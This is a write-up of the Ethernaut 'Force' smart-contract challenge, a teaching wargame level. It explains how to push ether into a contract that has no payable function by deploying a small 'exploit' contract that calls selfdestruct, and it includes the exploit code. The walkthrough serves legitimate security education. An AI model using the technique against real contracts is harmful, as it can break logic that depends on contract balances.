# Force

>Some contracts will simply not take your money ¯\_(ツ)_/¯
>
>The goal of this level is to make the balance of the contract greater than zero.

>  Things that might help:
>
> - Fallback methods
> - Sometimes the best way to attack a contract is with another contract.
> - See the "?" page above, section "Beyond the console"

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

In this challenge, we have an empty contract Force which does not have any payable function so it looks like there is no way to supply eth to this contract.

To pass this level, we must increase the balance of this contract. 

One way of doing this is by making use of `selfdestruct`.

Selfdestruct is a function which sends all remaining Ether stored in a contract to a designated address. 
You can read more about selfdestruct [here](https://www.alchemy.com/overviews/selfdestruct-solidity)

So what we can do is, write a smart contract `exploit`, transfer some eth to it and then call selfdestruct with address of the Force contract as arguement.

The exploit contract can be written like this,

```solidity
contract exploit{
    receive() external payable{}
    address payable _force = 0xE84694996a994931aC7b2925D4BaBB25C8d7c3d3;

    function destroy() public {
        selfdestruct(_force);
    }
}
```

Deploy this contract through remix (or on any other platform) and transact some eth to this contract. Call the destroy function and then check the balance of Force contract.

```javascript
await getBalance(contract.address)
'0.00000000000000001'
```

Now we can submit the instance.
